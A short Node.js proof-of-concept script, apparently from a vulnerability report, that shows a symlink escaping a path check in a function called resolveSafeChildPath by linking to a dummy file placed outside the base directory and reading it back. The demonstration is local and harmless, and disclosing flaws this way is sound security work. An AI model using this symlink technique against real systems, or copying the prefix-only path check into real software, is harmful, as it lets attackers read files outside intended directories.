'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const {resolveSafeChildPath} = require('./vulnerable_slice')

// --- PoC Exploit Code ---
function demoPoC() {
  try {
    // 1. Create a temporary base directory.
    const baseDir = fs.mkdtempSync(path.join(os.tmpdir(), 'vuln-demo-'));
    console.log('Base directory:', baseDir);

    // 2. Create a file that simulates sensitive data outside the base.
    // We'll place it in the parent directory of the base.
    const outsideFile = path.join(path.dirname(baseDir), 'sensitive.txt');
    fs.writeFileSync(outsideFile, 'Sensitive data: Exploited via symlink!');
    console.log('Sensitive file created outside base:', outsideFile);

    // 3. Create a symlink inside the base directory that points to the sensitive file.
    const symlinkName = 'link-to-sensitive';
    const symlinkPath = path.join(baseDir, symlinkName);
    fs.symlinkSync(outsideFile, symlinkPath);
    console.log('Created symlink inside base:', symlinkPath, '->', outsideFile);

    // 4. Use the vulnerable function to resolve the symlink.
    //    The check passes because path.resolve(baseDir, 'link-to-sensitive')
    //    simply resolves to baseDir/link-to-sensitive (a string starting with baseDir).
    const resolved = resolveSafeChildPath(baseDir, symlinkName);
    console.log('Resolved path:', resolved);

    // 5. Read the file via the resolved path.
    //    Although the resolved path appears safe, following the symlink accesses the sensitive file.
    const content = fs.readFileSync(resolved, 'utf8');
    console.log('Content read from resolved symlink:', content);
  } catch (error) {
    console.error('Error occurred:', error);
  }
}

demoPoC();

